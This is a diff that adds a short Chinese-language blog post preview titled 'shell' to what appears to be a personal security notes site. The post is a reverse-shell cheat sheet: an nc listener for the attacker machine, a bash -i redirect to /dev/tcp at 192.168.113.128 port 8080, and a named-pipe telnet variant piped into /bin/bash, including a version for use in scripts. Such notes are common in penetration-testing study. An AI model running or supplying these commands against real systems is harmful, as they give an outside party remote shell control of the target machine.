@@ -158,6 +158,23 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2>shell
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>一般选择反弹shell 攻击机：
+nc -lnvp 8080 目标机：
+bash -i &gt;&amp; /dev/tcp/192.168.113.128/8080 0&gt;&amp;1或bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.113.128/8080 0&gt;&amp;1&#34; 或者
+mknod /ram/f p; /bin/telnet 192.168.113.128 8080 &lt; /ram/f | /bin/bash &gt;/ram/f 2&gt;&amp;1 mknod：创建名为 /ram/f的管道
+若在脚本中使用：
+rm /tmp/f;mknod /tmp/f p;/bin/telnet 192.168.1.3 8080 &lt; /tmp/f |/bin/bash &gt;/tmp/f 2&gt;/tmp/f </p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to shell" href="https://jellyfish-pro.github.io/note/shell/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2>tcpdump快速使用
     </h2>
   </header>
